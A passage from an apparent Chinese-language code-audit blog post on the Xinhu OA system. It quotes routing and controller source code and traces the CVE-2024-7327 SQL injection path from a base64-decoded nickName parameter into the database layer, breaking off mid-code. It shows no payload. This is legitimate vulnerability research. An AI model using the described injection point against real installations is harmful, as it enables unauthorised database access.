class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$m</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line"><span class="variable">$d</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;default&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ajaxbool</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line"><span class="variable">$mode</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;m&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$config</span>[<span class="string">&#x27;install&#x27;</span>] &amp;&amp; <span class="variable">$mode</span> != <span class="string">&#x27;install&#x27;</span>)<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">location</span>(<span class="string">&#x27;?m=install&#x27;</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;include/View.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这段代码主要涉及动态 URL 处理和页面导航逻辑的处理，包括模块（m）、动作（a）和数据（d）的参数提取。这样的逻辑通常出现在 MVC 框架或类似的动态 Web 应用中，用于决定哪个控制器和方法应该被调用<br><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image-1.png"><br>结合访问请求，可以看到这些参数对应着MVC框架中的内容<br>最后一行<code>include_once(&#39;include/View.php&#39;);</code><br>转而看下view.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$ajaxbool</span>))<span class="variable">$ajaxbool</span> = <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line"><span class="variable">$ajaxbool</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="variable">$ajaxbool</span>);</span><br><span class="line"><span class="variable">$p</span>= PROJECT;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$m</span>))<span class="variable">$m</span>=<span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$a</span>))<span class="variable">$a</span>=<span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$d</span>))<span class="variable">$d</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;m&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;a&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;d&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;M&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;A&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;D&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;P&#x27;</span>, <span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_m</span>= <span class="variable">$m</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">contain</span>(<span class="variable">$m</span>, <span class="string">&#x27;|&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$_mas</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_mas</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$_m</span>= <span class="variable">$_mas</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1/?1Action.php&#x27;</span>,ROOT_PATH, <span class="variable">$p</span>));</span><br><span class="line"><span class="variable">$rand</span>= <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,-<span class="number">1</span>)!=<span class="string">&#x27;/&#x27;</span> &amp;&amp; <span class="variable">$d</span>!=<span class="string">&#x27;&#x27;</span>)<span class="variable">$d</span>.=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$errormsg</span>= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$methodbool</span>= <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$actpath</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1/?2?3&#x27;</span>,ROOT_PATH, <span class="variable">$p</span>, <span class="variable">$d</span>, <span class="variable">$_m</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ACTPATH&#x27;</span>, <span class="variable">$actpath</span>);</span><br><span class="line"><span class="variable">$actfile</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1Action.php&#x27;</span>,<span class="variable">$actpath</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$actfile1</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1Action.php&#x27;</span>,<span class="variable">$actpath</span>, <span class="variable">$_m</span>);</span><br><span class="line"><span class="variable">$actbstr</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$actfile1</span>))<span class="keyword">include_once</span>(<span class="variable">$actfile1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$actfile</span>))&#123;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$actfile</span>);</span><br><span class="line"><span class="variable">$clsname</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;ClassAction&#x27;</span>;</span><br><span class="line"><span class="variable">$xhrock</span>= <span class="keyword">new</span> <span class="variable">$clsname</span>();</span><br><span class="line"><span class="variable">$actname</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;Action&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ajaxbool</span> == <span class="string">&#x27;true&#x27;</span>)<span class="variable">$actname</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;Ajax&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">method_exists</span>(<span class="variable">$xhrock</span>, <span class="variable">$actname</span>))&#123;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">beforeAction</span>();</span><br><span class="line"><span class="variable">$actbstr</span> = <span class="variable">$xhrock</span>-&gt;<span class="variable">$actname</span>();</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;bodyMessage = <span class="variable">$actbstr</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$actbstr</span>))&#123;<span class="keyword">echo</span> <span class="variable">$actbstr</span>;<span class="variable">$xhrock</span>-&gt;display=<span class="literal">false</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$actbstr</span>))&#123;<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$actbstr</span>);<span class="variable">$xhrock</span>-&gt;display=<span class="literal">false</span>;&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$methodbool</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>)<span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>.<span class="variable">$actname</span>.<span class="string">&#x27; not found;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">afterAction</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;actionfile not exists;&#x27;</span>;</span><br><span class="line"><span class="variable">$xhrock</span>= <span class="keyword">new</span> <span class="title class_">Action</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_showbool</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;display &amp;&amp; (<span class="variable">$ajaxbool</span> == <span class="string">&#x27;html&#x27;</span> || <span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;p&#x27;</span>]= <span class="variable">$p</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;a&#x27;</span>]= <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;m&#x27;</span>]= <span class="variable">$m</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;d&#x27;</span>]= <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;rand&#x27;</span>]= <span class="variable">$rand</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;qom&#x27;</span>]= QOM;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;path&#x27;</span>]= PATH;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;sysurl&#x27;</span>]= SYSURL;</span><br><span class="line"><span class="variable">$temppath</span>= <span class="string">&#x27;&#x27;</span>.ROOT_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$p</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$tplpaths</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$temppath</span>.<span class="string">&#x27;&#x27;</span>.<span class="variable">$d</span>.<span class="string">&#x27;&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$tplname</span>= <span class="string">&#x27;tpl_&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>!=<span class="string">&#x27;default&#x27;</span>)<span class="variable">$tplname</span>  .= <span class="string">&#x27;_&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$tplname</span>   .= <span class="string">&#x27;.&#x27;</span>.<span class="variable">$xhrock</span>-&gt;tpldom.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$mpathname</span>= <span class="variable">$tplpaths</span>.<span class="variable">$tplname</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;displayfile!=<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$xhrock</span>-&gt;displayfile))<span class="variable">$mpathname</span> = <span class="variable">$xhrock</span>-&gt;displayfile;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$mpathname</span>) || !<span class="variable">$methodbool</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$methodbool</span>)&#123;</span><br><span class="line"><span class="variable">$errormsg</span>= <span class="string">&#x27;in (&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;) not found Method(&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$errormsg</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$tplname</span>.<span class="string">&#x27; not exists;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$errormsg</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_showbool</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;display &amp;&amp; (<span class="variable">$ajaxbool</span> == <span class="string">&#x27;html&#x27;</span> || <span class="variable">$xhrock</span>-&gt;tpltype==<span class="string">&#x27;html&#x27;</span> || <span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>) &amp;&amp; <span class="variable">$_showbool</span>)&#123;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">setHtmlData</span>();</span><br><span class="line"><span class="variable">$da</span> = <span class="variable">$xhrock</span>-&gt;smartydata;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$xhrock</span>-&gt;assigndata <span class="keyword">as</span> <span class="variable">$_k</span>=&gt;<span class="variable">$_v</span>)<span class="variable">$$_k</span>=<span class="variable">$_v</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$mpathname</span>);</span><br><span class="line"><span class="variable">$_showbool</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于动态加载和执行 Web 应用的行动 (action) 脚本，处理 AJAX 请求，并动态加载视图模板。代码涵盖了从初始化变量、确定执行哪个控制器的哪个动作，到加载相应的 PHP 文件，以及处理和输出响应。</p><p>ok了 明白架构模式了 也知道了具体是怎么拼接的了 对于下面的请求：<br><code>POST /index.php?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=469139 </code><br>访问的是 loginClassAction 的 checkAction 方法，并且是异步请求。</p><h2 id="随便找个功能点"><a href="#随便找个功能点" class="headerlink" title="随便找个功能点"></a>随便找个功能点</h2><p><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image-2.png"><br>修改密码的点，跟进去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editpassAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">getconfig</span>(<span class="string">&#x27;systype&#x27;</span>)==<span class="string">&#x27;demo&#x27;</span>)<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;演示上不要修改&#x27;</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="variable language_">$this</span>-&gt;adminid;</span><br><span class="line"><span class="variable">$oldpass</span>= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;passoldPost&#x27;</span>);</span><br><span class="line"><span class="variable">$pasword</span>= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;passwordPost&#x27;</span>);</span><br><span class="line"><span class="variable">$msg</span>= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isempt</span>(<span class="variable">$pasword</span>))<span class="variable">$msg</span> =<span class="string">&#x27;新密码不能为空&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$oldpassa</span>= <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getmou</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">T</span>(<span class="string">&#x27;admin&#x27;</span>),<span class="string">&quot;`pass`&quot;</span>,<span class="string">&quot;`id`=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$oldpassa</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$oldpass</span>))<span class="variable">$msg</span> =<span class="string">&#x27;旧密码不正确&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$oldpassa</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$pasword</span>))<span class="variable">$msg</span> =<span class="string">&#x27;新旧密码不能相同&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">T</span>(<span class="string">&#x27;admin&#x27;</span>), <span class="string">&quot;`pass`=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$pasword</span>).<span class="string">&quot;&#x27;,`editpass`=`editpass`+1&quot;</span>, <span class="string">&quot;`id`=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>))<span class="variable">$msg</span>= <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">error</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$msg</span>, <span class="number">201</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好像没啥能利用的，主要是输入直接被md5了<br>再多测测看</p><h2 id="CVE-2024-7327"><a href="#CVE-2024-7327" class="headerlink" title="CVE-2024-7327"></a>CVE-2024-7327</h2><p>还得是公开cve<br>在信呼OA系统2.6.2版本的&#x2F;webmain&#x2F;task&#x2F;openapi&#x2F;openmodhetongAction.php文件中，存在一个前台SQL注入漏洞。当$nickName变量经过base64解码后被加入到uarr数组中，并最终传递给$db-&gt;record()方法进行SQL查询时，攻击者可以利用此漏洞进行SQL注入攻击。此外，还需要注意父类openapiAction.php中的init方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dataAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mobile&#x27;</span>);</span><br><span class="line">    <span class="variable">$xcytype</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;xcytype&#x27;</span>);</span><br><span class="line">    <span class="variable">$openid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;openid&#x27;</span>);</span><br><span class="line">    <span class="variable">$nickName</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;nickName&#x27;</span>));</span><br><span class="line">    <span class="variable">$htdata</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$db</span>   = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;wxxcyus&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;mobile&#x27;</span>]   = <span class="variable">$mobile</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;xcytype&#x27;</span>]   = <span class="variable">$xcytype</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;openid&#x27;</span>]   = <span class="variable">$openid</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;nickName&#x27;</span>]   = <span class="variable">$nickName</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;province&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;province&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;city&#x27;</span>]     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;city&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;gender&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;gender&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;dingyue&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;dingyue&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;avatarUrl&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;avatarUrl&#x27;</span>));</span><br><span class="line">    <span class="variable">$where</span> = <span class="string">&quot;`openid`=&#x27;<span class="subst">$openid</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">rows</span>(<span class="variable">$where</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$uarr</span>[<span class="string">&#x27;adddt&#x27;</span>] = <span class="variable language_">$this</span>-&gt;now;</span><br><span class="line">      <span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$uarr</span>[<span class="string">&#x27;optdt&#x27;</span>] = <span class="variable language_">$this</span>-&gt;now;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$uarr</span>, <span class="variable">$where</span>);</span><br></pre></td></tr></table></figure><p>跟进该方法 &#x2F;include&#x2F;Model.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params"><span class="variable">$arr</span>, <span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$arr</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到了 &#x2F;include&#x2F;class&#x2F;mysql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$array</span>,<span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$addbool</span>    = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isempt</span>(<span class="variable">$where</span>))<span class="variable">$addbool</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$cont</span>    = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$cont</span>.=<span class="string">&quot;,`<span class="subst">$key</span>`=&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toaddval</span>(<span class="variable">$val</span>).<span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$cont</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$cont</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;<span 